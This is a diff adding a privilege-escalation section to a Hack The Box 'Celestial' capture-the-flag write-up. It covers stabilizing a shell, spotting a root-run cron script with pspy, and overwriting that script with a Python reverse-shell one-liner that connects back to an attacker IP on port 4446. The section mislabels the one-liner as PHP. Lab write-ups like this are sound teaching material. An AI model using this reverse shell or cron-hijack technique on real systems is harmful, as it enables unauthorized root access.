@@ -54,6 +54,48 @@ After this we finally base64 encode it so we can pass it as the cookie parameter
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/5.png">
 
 
+# Privilege Escalation
+First we'll stabilize the shell. We'll run ```which python``` to shows that it has python.
+We then run the following commands:
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+press ctrl+z key combination 
+
+stty raw -echo; fg
+```
+
+One thing we notice is that user ```sun``` is part of the ```sudo``` group. We also spot a file called ```script.py``` in the home directory. One directory higher we find ```output.txt``` which get's changed every 5 minutes. The content is the content from ```script.py```.
+
+If this script is initiated by a root account we can try to alter the content of the file in order to give us a root shell.
+
+We can use ```pspy``` to see what's exactly going on. Download it from [here](https://github.com/DominicBreuker/pspy). 
+
+After a few minutes we see the following commands proving what we already thought:
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/6.png">
+
+Good news! Now we can use a oneliner php shell and save it as the script:
+```
+echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > script.py
+```
+
+With our new listener ready on port 4446 we wait for a few minutes for the script to run. As soon as it gets executed a root shell will pop up.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
